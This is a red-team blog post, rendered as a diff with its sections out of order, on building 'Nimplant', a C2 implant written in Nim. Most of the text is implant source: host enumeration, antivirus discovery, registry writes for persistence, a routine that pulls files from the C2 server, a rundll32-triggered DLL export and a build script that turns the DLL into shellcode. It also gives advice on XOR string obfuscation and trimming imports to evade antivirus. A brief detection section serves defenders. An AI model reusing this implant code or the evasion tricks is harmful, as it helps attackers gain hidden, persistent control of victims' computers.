-    result = <span style=color:#ed9d13>&#34;Copied &#39;&#34;</span> &amp; source &amp; <span style=color:#ed9d13>&#34;&#39; to &#39;&#34;</span> &amp; destination &amp; <span style=color:#ed9d13>&#34;&#39;.&#34;</span>
-</code></pre></div><p>Note the use of <a href=https://nim-by-example.github.io/varargs/>varargs</a> in the function parameters. This type allows us to receive one to many commands from the C2 server inside of an array, This allows us to parse commands and deal with possible exceptions inside the function itself.</p>
-<p><strong>&lsquo;Whoami&rsquo; command</strong></p>
-<p>While not too interesting on itself, the <code>whoami</code> command provides a nice use case of using benign Windows APIs to achieve your goals. Nimplant&rsquo;s implementation, quite simply, uses the <a href=https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea>GetUserName</a> API to retrieve the user&rsquo;s name.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>winim</span>/lean <span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>GetUserName</span>, <span style=color:#447fcf;text-decoration:underline>LPWSTR</span>, <span style=color:#447fcf;text-decoration:underline>DWORD</span>, <span style=color:#447fcf;text-decoration:underline>TCHAR</span>
-<span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>winim</span>/utils <span style=color:#6ab825;font-weight:700>import</span> <span style=color:#a61717;background-color:#e3d2d2>`</span>&amp;<span style=color:#a61717;background-color:#e3d2d2>`</span>
-
-<span style=color:#999;font-style:italic># Get the current username via the GetUserName API</span>
-proc whoami*() : string =
-    var 
-        buf : array[<span style=color:#3677a9>257</span>, TCHAR] <span style=color:#999;font-style:italic># 257 is UNLEN+1 (max username length plus null terminator)</span>
-        lpBuf :  LPWSTR = addr buf[<span style=color:#3677a9>0</span>]
-        pcbBuf : DWORD = int32(<span style=color:#24909d>len</span>(buf))
-
-		<span style=color:#999;font-style:italic># The actual API call</span>
-    discard GetUserName(lpBuf, &amp;pcbBuf)
-
-		<span style=color:#999;font-style:italic># Read the buffer into the function result</span>
-    <span style=color:#6ab825;font-weight:700>for</span> character <span style=color:#6ab825;font-weight:700>in</span> buf:
-        <span style=color:#6ab825;font-weight:700>if</span> character == <span style=color:#3677a9>0</span>: <span style=color:#6ab825;font-weight:700>break</span>
-        result.add(char(character))
-</code></pre></div><p><a href=https://github.com/khchen/winim>Winim</a> is used to ease the pain of manually defining the right structures and importing the right functions from the Windows API. However, there is one important note to make here regarding OPSEC: Importing full modules from libraries like <code>winim</code> makes it so that your binary becomes bloated with unnecessary function import statements - including imports that can be considered malicious by antivirus. I found that specifically selecting your imports (as shown above) helps reduce the fingerprint of your binary, while increasing overall evasion.</p>
-<p><strong>&lsquo;GetAV&rsquo; command</strong></p>
-<p>The <code>GetAV</code> command is an example of a convenience command I added for operators to more quickly gain a lay of the land once they get a callback from a machine. It&rsquo;s almost equivalent to byt3bl33der&rsquo;s <a href=https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/wmiquery_bin.nim>wmiquery_bin</a> example from OffensiveNim, except it parses the output a bit different. It also serves as a nice example of how easy it is to &lsquo;plug in&rsquo; new commands once you have the base structure of parsing input and output down.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>winim</span>/com
-<span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>strutils</span> <span style=color:#6ab825;font-weight:700>import</span> strip
-
-<span style=color:#999;font-style:italic># Get antivirus products on the machine via WMI</span>
-proc getAv*() : string =
-    let wmisec = GetObject(<span style=color:#ed9d13>r</span><span style=color:#ed9d13>&#34;winmgmts:{impersonationLevel=impersonate}!</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>.\root\securitycenter2&#34;</span>)
-    <span style=color:#6ab825;font-weight:700>for</span> avprod <span style=color:#6ab825;font-weight:700>in</span> wmisec.execQuery(<span style=color:#ed9d13>&#34;SELECT displayName FROM AntiVirusProduct</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>):
-        result.add(<span style=color:#a61717;background-color:#e3d2d2>$</span>avprod.displayName &amp; <span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\n</span><span style=color:#ed9d13>&#34;</span>)
-    result = result.strip(trailing = true)
-</code></pre></div><p>Unfortunately, in this instance we have to import the entire <code>winim/com</code> library, since it exports some types that cannot be imported individually (at least, I didn&rsquo;t find out how).</p>
-<p><strong>&lsquo;Reg&rsquo; command</strong></p>
-<p>The <code>reg</code> command is one of the more complex commands that&rsquo;s included in Nimplant. It builds upon Nim&rsquo;s <a href=https://nim-lang.org/docs/registry.html>registry</a> library to perform registry operations. This library is fairly straight-forward, as it only allows us to get or set variables in the <code>HKCU</code> or <code>HKLM</code> registries, which is fine for the purposes of Nimplant. The relative complexity inside this command comes from the fact that one command supports both reading and writing registry values, so the arguments need to be properly parsed to implement this functionality.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>registry</span>
-<span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>strutils</span> <span style=color:#6ab825;font-weight:700>import</span> join, split, startsWith
-
-<span style=color:#999;font-style:italic># Query or modify the Windows registry</span>
-proc reg*(args : varargs[string]) : string =
-
-    var
-        command : string
-        path : string
-        key : string
-        value : string
-        handleStr : string
-        regPath : string
-        handle : registry.HKEY
-
-    <span style=color:#999;font-style:italic># Parse arguments</span>
-    case args.len:
-        of <span style=color:#3677a9>2</span>:
-            command = args[<span style=color:#3677a9>0</span>]
-            path = args[<span style=color:#3677a9>1</span>]
-        of <span style=color:#3677a9>3</span>:
-            command = args[<span style=color:#3677a9>0</span>]
-            path = args[<span style=color:#3677a9>1</span>]
-            key = args[<span style=color:#3677a9>2</span>]
-        of <span style=color:#3677a9>4</span>:
-            command = args[<span style=color:#3677a9>0</span>]
-            path = args[<span style=color:#3677a9>1</span>]
-            key = args[<span style=color:#3677a9>2</span>]
-            value = args[<span style=color:#3677a9>3</span> .. ^<span style=color:#3677a9>1</span>].join(<span style=color:#ed9d13>&#34; &#34;</span>)
-        <span style=color:#6ab825;font-weight:700>else</span>:
-            result = <span style=color:#ed9d13>&#34;Invalid number of arguments received. Usage: &#39;reg [query|add] [path] &lt;optional: key&gt; &lt;optional: value&gt;&#39;.&#34;</span>
-            <span style=color:#6ab825;font-weight:700>return</span>
-
-    <span style=color:#999;font-style:italic># Parse the registry path</span>
-    <span style=color:#6ab825;font-weight:700>try</span>:
-        handleStr = path.split(<span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>&#34;</span>)[<span style=color:#3677a9>0</span>]
-        regPath = path.split(<span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>&#34;</span>, <span style=color:#3677a9>1</span>)[<span style=color:#3677a9>1</span>]
-    <span style=color:#6ab825;font-weight:700>except</span>:
-        result = <span style=color:#ed9d13>&#34;Unable to parse registry path. Please use format: &#39;HKCU</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>Software</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>Microsoft</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>Windows</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>CurrentVersion</span><span style=color:#ed9d13>\\</span><span style=color:#ed9d13>Run&#39;.&#34;</span>
-        <span style=color:#6ab825;font-weight:700>return</span>
-
-    <span style=color:#999;font-style:italic># Identify the correct hive from the parsed path</span>
-    <span style=color:#6ab825;font-weight:700>if</span> handleStr.startsWith(<span style=color:#ed9d13>&#34;HKCu&#34;</span>):
-        handle = registry.HKEY_CURRENT_USER
-    <span style=color:#6ab825;font-weight:700>elif</span> handleStr.startsWith(<span style=color:#ed9d13>&#34;HKLM&#34;</span>):
-        handle = registry.HKEY_LOCAL_MACHINE
-    <span style=color:#6ab825;font-weight:700>else</span>:
-        result = <span style=color:#ed9d13>&#34;Invalid registry. Only &#39;HKCU&#39; and &#39;HKLM&#39; are supported at this time.&#34;</span>
-        <span style=color:#6ab825;font-weight:700>return</span>
-
-    <span style=color:#999;font-style:italic># Query an existing registry value</span>
-    <span style=color:#6ab825;font-weight:700>if</span> command == <span style=color:#ed9d13>&#34;query&#34;</span>:
-        result = getUnicodeValue(regPath, key, handle)
-
-    <span style=color:#999;font-style:italic># Add a value to the registry</span>
-    <span style=color:#6ab825;font-weight:700>elif</span> command == <span style=color:#ed9d13>&#34;add&#34;</span>:
-        setUnicodeValue(regPath, key, value, handle)
-        result = <span style=color:#ed9d13>&#34;Successfully set registry value.&#34;</span>
-
-    <span style=color:#6ab825;font-weight:700>else</span>:
-        result = <span style=color:#ed9d13>&#34;Unknown reg command. Please use &#39;reg query&#39; or &#39;reg add&#39; followed by the path (and value when adding a key).&#34;</span>
-</code></pre></div><p>Example usage of this command for &ldquo;persistence&rdquo; (<code>calc.exe</code> ftw) is shown below.</p>
-<p><img src=/images/nimplant-registry.png alt="Nimplant &lsquo;reg&rsquo; command"></p>
-<p><strong>&lsquo;Upload&rsquo; command</strong></p>
-<p>The <code>upload</code> command is interesting because it requires a modification in server behavior. In essence, it is almost the same as the <code>wget</code> command, which downloads a file from a remote source. However, in case of <code>upload</code>, a file is temporarily hosted on the C2 for the implant to download (it is called &ldquo;upload&rdquo; because downloading a file on the implant is &lsquo;uploading&rsquo; it from the operator&rsquo;s perspective).</p>
-<p>Because compiling the native web library with SSL support is wholly broken in Nim, I resorted to using the excellent <a href=https://github.com/treeform/puppy>Puppy</a> library for all web interactions, including C2 traffic and web-based commands like <code>curl</code> or <code>wget</code>. This library which uses the <code>WinHTTP</code> API under the hood, so it should blend in quite well. It also supports transparent Gzip deflation, which is utilized to compress the file in-transit.</p>
-<p>The command is executed in two phases. First, when the <code>upload</code> command is received by the C2 server, it parses the file to upload, GZip-compresses it, and makes it available for download after providing it with a unique ID. This ID is then passed on to the implant along with the <code>upload</code> command, allowing it to find and download the file. Because WinHTTP is used for the transfer, it looks like a regular file download from a networking perspective.</p>
-<p>Because of this, the Nim code is relatively straight-forward. The bulk of it is again parsing parameters and determining the destination on disk, this time with the addition of parsing some settings from the listener configuration.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>puppy</span>
-<span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>strutils</span> <span style=color:#6ab825;font-weight:700>import</span> join, split
-<span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>os</span> <span style=color:#6ab825;font-weight:700>import</span> getcurrentdir, <span style=color:#a61717;background-color:#e3d2d2>`</span>/<span style=color:#a61717;background-color:#e3d2d2>`</span>
-<span style=color:#6ab825;font-weight:700>from</span> <span style=color:#447fcf;text-decoration:underline>..</span>/util/webClient <span style=color:#6ab825;font-weight:700>import</span> <span style=color:#447fcf;text-decoration:underline>Listener</span>
-
-<span style=color:#999;font-style:italic># Upload a file from the C2 server to Nimplant</span>
-<span style=color:#999;font-style:italic># From Nimplant&#39;s perspective this is similar to wget, but calling to the C2 server instead</span>
-proc upload*(li : Listener, args : varargs[string]) : string =
-    var 
-        fileId : string
-        fileName : string
-        filePath : string
-        url : string
-        res : string
-
-		<span style=color:#999;font-style:italic># The command is passed as &#39;upload [localfile] &lt;remotedestination&gt;&#39;</span>
-		<span style=color:#999;font-style:italic># It is however transmitted as &#39;upload [file-identifier] [originalfilename] &lt;remotedestination&gt;&#39;</span>
-    <span style=color:#6ab825;font-weight:700>if</span> args.len == <span style=color:#3677a9>2</span> <span style=color:#6ab825;font-weight:700>and</span> args[<span style=color:#3677a9>0</span>] != <span style=color:#ed9d13>&#34;&#34;</span> <span style=color:#6ab825;font-weight:700>and</span> args[<span style=color:#3677a9>1</span>] != <span style=color:#ed9d13>&#34;&#34;</span>:
-        fileId = args[<span style=color:#3677a9>0</span>]
-        fileName = args[<span style=color:#3677a9>1</span>]
-        filePath = getCurrentDir()/fileName
-    <span style=color:#6ab825;font-weight:700>elif</span> args.len &gt;= <span style=color:#3677a9>3</span>:
-        fileId = args[<span style=color:#3677a9>0</span>]
-        fileName = args[<span style=color:#3677a9>1</span>]
-        filePath = args[<span style=color:#3677a9>2</span> .. ^<span style=color:#3677a9>1</span>].join(<span style=color:#ed9d13>&#34; &#34;</span>)
-    <span style=color:#6ab825;font-weight:700>else</span>:
-        <span style=color:#999;font-style:italic># Handling of the second argument (filename) is done by the python server</span>
-        result = <span style=color:#ed9d13>&#34;Invalid number of arguments received. Usage: &#39;upload [local file] [optional: remote file]&#39;.&#34;</span>
-        <span style=color:#6ab825;font-weight:700>return</span>
-    
-		<span style=color:#999;font-style:italic># Parse the staging server from the configuration file</span>
-    url = li.listenerType &amp; <span style=color:#ed9d13>&#34;://&#34;</span>
-    <span style=color:#6ab825;font-weight:700>if</span> li.listenerHost != <span style=color:#ed9d13>&#34;&#34;</span>:
-        url = url &amp; li.listenerHost
-    <span style=color:#6ab825;font-weight:700>else</span>:
-        url = url &amp; li.listenerIp &amp; <span style=color:#ed9d13>&#34;:&#34;</span> &amp; li.listenerPort
-    url = url &amp; li.taskpath &amp; <span style=color:#ed9d13>&#34;/&#34;</span> &amp; fileId &amp; <span style=color:#ed9d13>&#34;?id=&#34;</span> &amp; li.id
-
-    <span style=color:#999;font-style:italic># Download the file - Puppy will take care of transparent gzip deflation</span>
-    res = fetch(
-            url,
-            headers = @[Header(key: <span style=color:#ed9d13>&#34;User-Agent&#34;</span>, value: li.userAgent)]
-            )
-    
-    <span style=color:#6ab825;font-weight:700>if</span> res == <span style=color:#ed9d13>&#34;&#34;</span>:
-        result = <span style=color:#ed9d13>&#34;Something went wrong uploading the file (Nimplant did not receive response from staging server &#39;&#34;</span> &amp; url &amp; <span style=color:#ed9d13>&#34;&#39;).&#34;</span>
-        <span style=color:#6ab825;font-weight:700>return</span>
-    <span style=color:#6ab825;font-weight:700>else</span>:
-        filePath.writeFile(res)
-        result = <span style=color:#ed9d13>&#34;Uploaded file to &#39;&#34;</span> &amp; filePath &amp; <span style=color:#ed9d13>&#34;&#39;.&#34;</span>
-</code></pre></div><p><strong>Defense Evasion</strong></p>
-<p>As mentioned earlier on in this post, the idea behind Nimplant is to minimize malicious functionality. This includes defense evasion tricks that, when spotted by a defender, reveal the true nature of Nimplant. I did however choose to include a variant of <a href=https://github.com/Yardanico/nim-strenc>nim-strenc</a>, a library that implements a macro that XOR-encodes static strings at compile time. I&rsquo;d recommend to take a look at the code, it&rsquo;s a pretty good example of how powerful compile-time macro&rsquo;s can be in Nim.</p>
-<p>Though this results in a collection of strings that may look suspicious on manual inspection, it has several advantages. First, it hides semi-sensitive string values from prying eyes, unless an analyst is brave enough to open up a debugger. Additionally, the random seeds for XOR-encoding ensure that the fingerprint of Nimplant is different every time it is compiled, even if the same configuration is used. This helps prevent static fingerprinting of the binary by e.g. the MD5 hash of the file. Finally, using XOR does not affect the entropy value of the binary - an important measure for determining if encrypted and potentially malicious content is present in a binary. Overall, this results in a net benefit for Nimplant where some degree of obfuscation is achieved while limiting the amount of suspicious indicators.</p>
-<h3 id=the-wrapper>The Wrapper</h3>
-<p>The last component of Nimplant is a wrapper script that helps users with compiling the appropriate binaries (after correctly configuring the shared <code>config.toml</code> file), and setting up the C2 server. It supports a variety of compilation options, including <code>.exe</code>, <code>.dll</code>, and <code>.bin</code>. The first two are supported natively by Nim, and are implemented through a compile-time flag in the main Nim function, as follows.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>when defined exportDll:
-		<span style=color:#999;font-style:italic># Manually define the NimMain() function for garbage collection (thanks OffensiveNim)</span>
-    proc NimMain() {.cdecl, importc.}
-
-		<span style=color:#999;font-style:italic># Define an exported function that can be used to trigger the DLL</span>
-		<span style=color:#999;font-style:italic># In this example, one would run &#39;rundll32 .\file.dll,Connect&#39; to execute</span>
-    proc Connect(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : <span style=color:#24909d>bool</span> {.stdcall, exportc, dynlib.} =
-        NimMain()
-        runNp()
-        <span style=color:#6ab825;font-weight:700>return</span> true
-
-<span style=color:#6ab825;font-weight:700>else</span>:
-		<span style=color:#999;font-style:italic># Structure the binary as a regular executable</span>
-    when isMainModule:
-        runNp()
-</code></pre></div><p>The compilation helper function basically just constructs the Nim compilation command, accounting for any compile-time and cross-compilation flags that may be needed. If position-independent shellcode is requested as an output format (useful when using other shellcode packers, like Nimpackt 😏), the <code>ConvertToShellcode</code> function from the excellent <a href=https://github.com/monoxgas/sRDI/blob/master/Python/ShellcodeRDI.py>ShellcodeRDI.py</a> is used to convert a freshly generated Nim DLL file to shellcode. Though this is a pretty well-documented technique by now that brings some obvious OPSEC risks, it seems to work quite well in the situations that it&rsquo;s needed. The compilation helper function looks like this.</p>
-<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>def compileNim(<span style=color:#24909d>type</span>):
-    <span style=color:#6ab825;font-weight:700>if</span> (<span style=color:#24909d>type</span> == <span style=color:#ed9d13>&#34;exe&#34;</span> or <span style=color:#24909d>type</span> == <span style=color:#ed9d13>&#34;dll&#34;</span>):
-				<span style=color:#999;font-style:italic># Define base compilation command</span>
-        <span style=color:#40ffff>compileCommand</span> = <span style=color:#ed9d13>&#34;nim c --hints:off --warnings:off -d:release -d:strip --opt:size --passc=-flto --passl=-flto --app:gui -o:client/bin/&#34;</span>
-
-        <span style=color:#6ab825;font-weight:700>if</span> <span style=color:#24909d>type</span> == <span style=color:#ed9d13>&#34;dll&#34;</span>:
-						<span style=color:#999;font-style:italic># Add flags for DLL compilation</span>
-						<span style=color:#999;font-style:italic># The &#39;-d:exportDll&#39; flag triggers the &#39;when defined&#39; statements shown above</span>
-            <span style=color:#40ffff>compileCommand</span> = compileCommand + <span style=color:#ed9d13>&#34; --app=lib --nomain -d:exportDll&#34;</span>
-
-        <span style=color:#6ab825;font-weight:700>if</span> os.name != <span style=color:#ed9d13>&#34;nt&#34;</span>:
-						<span style=color:#999;font-style:italic># Use cross-compilation from Linux using MinGW</span>
-            <span style=color:#40ffff>compileCommand</span> = compileCommand + <span style=color:#ed9d13>&#34; -d=mingw&#34;</span>
-
-        <span style=color:#40ffff>compileCommand</span> = compileCommand + <span style=color:#ed9d13>&#34; client/NimPlant.nim&#34;</span>
-        os.system(compileCommand)
-
-    <span style=color:#6ab825;font-weight:700>elif</span> (<span style=color:#24909d>type</span> == <span style=color:#ed9d13>&#34;raw&#34;</span>):
-				<span style=color:#999;font-style:italic># Generate PIC from Nim DLL using sRDI</span>
-        <span style=color:#6ab825;font-weight:700>if</span> not os.path.isfile(<span style=color:#ed9d13>&#34;client/bin/NimPlant.dll&#34;</span>):
-            compileNim(<span style=color:#ed9d13>&#34;dll&#34;</span>)
-
-        <span style=color:#40ffff>dll</span> = open(<span style=color:#ed9d13>&#34;client/bin/NimPlant.dll&#34;</span>, <span style=color:#ed9d13>&#34;rb&#34;</span>).read()
-        <span style=color:#40ffff>shellcode</span> = ConvertToShellcode(dll, HashFunctionName(<span style=color:#ed9d13>&#39;Update&#39;</span>), <span style=color:#40ffff>flags</span>=0x5)
-        with open(<span style=color:#ed9d13>&#34;client/bin/NimPlant.bin&#34;</span>, <span style=color:#ed9d13>&#34;wb&#34;</span>) as f:
-            f.write(shellcode)
-
-    <span style=color:#6ab825;font-weight:700>else</span>:
-        print(<span style=color:#ed9d13>&#34;ERROR: Unrecognized compile type.&#34;</span>)
-</code></pre></div><p>If the user has prepared the binaries that they want, they are ready to start the server. Of course, the same script offers a convenient <code>server</code> flag to launch the server, which will use the same <code>config.toml</code> used to generate the Nimplant files. The operator is now ready for action!</p>
-<p><img src=/images/nimplant-console.png alt="Nimplant Console"></p>
-<h2 id=detection-guidance>Detection Guidance</h2>
-<p>Now, since I&rsquo;m one of those pesky red teamers and Nimplant will be used in red teaming engagements, I cannot share specific IOCs. That would just be shooting myself (and several others) in the foot. However, as I&rsquo;m not all bad, I will try to put on my best blue hat and share some generic detection guidance.</p>
-<p>As with all detection, it is preferable <strong>not</strong> to focus on the detection of specific tools, but rather try to develop generic rules that catch certain techniques. Nimplant is no exception to this, as its techniques for establishing C2 communications and managing commands aren&rsquo;t at all new. As such, if you see an untrusted binary or unusual process calling out to the internet and subsequently executing suspicious commands - that&rsquo;s something to investigate.</p>
-<p>As mentioned, the available functionality of Nimplant is limited to &ldquo;benign&rdquo; operating system features as much as possible. While this decreases the attack surface in a sense, it introduces some limitations for operators. If an operator wants to deploy a Cobalt Strike beacon from Nimplant, for example, they will have to resort to techniques that use this native functionality. This means that classic detections, focusing on for example the filesystem and registry, work well here.</p>
-<p>If you get a hold of a Nimplant binary in some way, it will also carry some indicators. It will obviously point to Nim being used as a programming language, but that&rsquo;s not an indicator on its own. What&rsquo;s more interesting is the function names and (potential) imports in the binary. If you are lucky enough to get a memory dump of a running Nimplant process, try digging for the encryption key. Having this should allow you to prove beyond a shadow of a doubt that you&rsquo;re dealing with something malicious&mldr;</p>
-<p>Obviously I&rsquo;m not a defender, so I probably missed a couple good detection points and pitfalls. If you have any additions (or improvements from an offensive perspective), please do let me know!</p>
-<h2 id=when-open-source>When open source?!</h2>
-<p>As mentioned above, I&rsquo;m very much a fan of open-sourcing tools, including offensive tooling (within limits of reason, of course). Open-sourcing a tool such as Nimplant allows anyone to have a look at your code and potentially contribute to it. That&rsquo;s a good thing, but it also increases the risk of defenders fingerprinting your code to create detections for it. As we still would like to make use of Nimplant in engagements where it isn&rsquo;t immediately detected I am not open-sourcing the tool for the time being. Hopefully I&rsquo;ll be able to do this somewhere in the future, once we got some good use out of it!</p>
-<p>However, Nimplant is in no way new or ground-breaking, and the techniques it uses are all known. If you&rsquo;re interested in tools like this, the resources are out there to start building your own. Not only does this work better for evading defenses, it provides a great learning experience and something to show on your resume. Obviously building your own C2 from scratch isn&rsquo;t a necessity, extending or modifying an existing open-source framework or even playing with the several extension kits for Cobalt Strike can already bring great results.</p>
-<p>If you&rsquo;re stuck on any offensive (Nim) development project don&rsquo;t hesitate to reach out, I&rsquo;m always happy to help (given the purposes of your project are ethical - obviously). In the end, the most important things are to learn, have fun, and help your clients become more secure.</p>
-</div>
-</article>
-<hr>
-<div class=post-info>
-<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
-<span class=tag><a href=https://casvancooten.com/tags/nim/>Nim</a></span>
+<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=/about/>About</a></li><li><a href=/posts/>Blog</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>25 minutes</p></div><article><h1 class=post-title><a href=https://casvancooten.com/posts/2021/08/building-a-c2-implant-in-nim-considerations-and-lessons-learned/>Building a C2 Implant in Nim - Considerations and Lessons Learned</a></h1><hr><aside id=toc><div class=toc-title>Table of Contents</div><nav id=TableOfContents><ul><li><a href=#nim-for-offensive-security>Nim for offensive security</a></li><li><a href=#why-another-c2>Why another C2?!</a></li><li><a href=#introducing-nimplant---a-lightweight-implant-and-c2-framework>Introducing Nimplant - a lightweight implant and C2 framework</a></li><li><a href=#the-tech-stuff>The Tech Stuff!</a><ul><li><a href=#the-c2-server>The C2 Server</a></li><li><a href=#the-web-interface>The Web Interface</a></li><li><a href=#the-implant>The Implant</a></li><li><a href=#the-wrapper>The Wrapper</a></li></ul></li><li><a href=#detection-guidance>Detection Guidance</a></li><li><a href=#when-open-source>When open source?!</a></li></ul></nav></aside><hr><div class=post-content><h2 id=nim-for-offensive-security>Nim for offensive security</h2><p>For a while now I have been playing with the programming language <a href=https://nim-lang.org/>Nim</a> in the context of Offensive Security. Nim is a relatively young and fairly unknown programming language that has a syntax quite similar to Python&rsquo;s, so is very easy to pick up. It however offers the flexibility and low-level capabilities of languages like C/C++, and has a great foreign function interface. On top of that, it compiles to native C (as well as some other languages), which results in native binaries that are quite slim. This makes it very suitable for malware development, especially for scrubs that are too scared of C/C++ to write any proper program in those languages (like me!).</p><p>My early work in Nim was <em>very</em> inspired by <a href=https://twitter.com/byt3bl33d3r>byt3bl33d3r</a> and his <a href=https://github.com/byt3bl33d3r/OffensiveNim>OffensiveNim</a> repository. In getting started, this repository is a true goldmine of code snippets and examples that you might need. It has examples on execution methods, integration with the Windows API, bypasses, and some other great malware tricks. Inspired by this repository I started to work on a malware packer/dropper, that could both execute raw shellcode and .NET binaries in a way that evades AV and most EDRs. Dubbed <strong>NimPackt</strong>, this project turned out quite well and is actively used in our red team operations to generate evasive binaries. Though that means I want to avoid sharing the full source code to prevent fingerprinting for now, I might do a blog post about it one day (if there&rsquo;s enough interest).</p><p>If you want to get started with malware development in Nim yourself, I can recommend <a href=https://huskyhacks.dev/2021/07/17/nim-exploit-dev/>this blog post</a> by <a href=https://twitter.com/HuskyHacksMK>HuskyHacks</a>, which explains how to set up a Nim development environment and build your first process injector using Nim. Beyond that, the OffensiveNim repository linked above should definitely help you build more advanced tools.</p><h2 id=why-another-c2>Why another C2?!</h2><p>Command and Control (C2) frameworks have been popping up left and right in the offensive security tooling landscape. On a high level, a C2 allows you to communicate with malware implants remotely, typically in a client-server type of architecture. The C2 channel, as well as the type of implant and functionality, can differ wildly per C2 framework. Most frameworks are however designed to be flexible and extensible, and can be adapted to your needs. Some frameworks are commercial and closed-source (Cobalt Strike), but there are many open-source alternatives available. A good overview of solutions and capabilities is provided in <a href=https://www.thec2matrix.com/matrix>the C2 matrix</a>.</p><p>If there are so many free and flexible C2 frameworks, why build another one? Good question, reader! I&rsquo;m sure that my goals (see next section) could&rsquo;ve been achieved by extending or modifying an open-source framework. However, adapting or extending an existing framework requires you to thoroughly understand the framework and its features, which requires a significant time investment either way. Additionally, the downside of open-source tooling is that defenders have the same access to it as us red-colored folk do - therefore it tends to be quickly fingerprinted.</p><p><em>As much as I would like to open-source Nimplant, I cannot do that just yet for this reason. I will try my best to share the most interesting code snippets so you can build your own (or work on detection rules 👀). Once we &ldquo;retire&rdquo; Nimplant from production use, I will make sure to open-source it.</em></p><p>Building your own C2, on the other hand, brings a couple of advantages. First and foremost it is a fun learning project which allows you to challenge yourself to explore the edges of your ability. Additionally, building your own C2 allows you full control over the tactics, techniques, and procedures (TTPs) applied in your framework, and by extension the indicators of compromise (IOCs) that you will leave in your client&rsquo;s environment. Though it comes at the cost of a sizeable time investment, this was enough for me to &ldquo;roll&rdquo; my own C2 in Nim.</p><h2 id=introducing-nimplant---a-lightweight-implant-and-c2-framework>Introducing Nimplant - a lightweight implant and C2 framework</h2><p><img src=/images/nimplant-logo.png alt="Nimplant Logo"></p><p>With all that out of the way, let&rsquo;s get to the meat &rsquo;n&rsquo; potatoes of this post - <strong>Nimplant</strong>! Nimplant is what I dubbed the C2, obviously (and very unoriginally) because of the implant written in Nim. As it turns out, I wasn&rsquo;t the first with this idea&mldr;</p><blockquote class=twitter-tweet><p lang=en dir=ltr>Ironically I also built a stage 0 implant in nim called nimplant 😆 never quite finished it tho, as with many projects 🤣 UIs looking sharp 😎</p>&mdash; Dominic Chell (@domchell) <a href="https://twitter.com/domchell/status/1414267057617739782?ref_src=twsrc%5Etfw">July 11, 2021</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><p>Nimplant is meant for use as a first-stage implant. This means that it is typically used for an initial infection, before dropping more elaborate malware such as a Cobalt Strike beacon. This use case poses a couple of requirements for the implant:</p><ul><li>It has to be <strong>lightweight</strong>. Operators should for example be able to drop it through a macro-enabled Office document, without arousing too much suspicion (looking at you Go, with your 5MB binaries&mldr;).</li><li>It has to be <strong>evasive</strong>. Stage-1 implants are commonly used when little is known about a target environment - including which defensive products are in use. As such, the implant should be able to evade most common defensive products without much 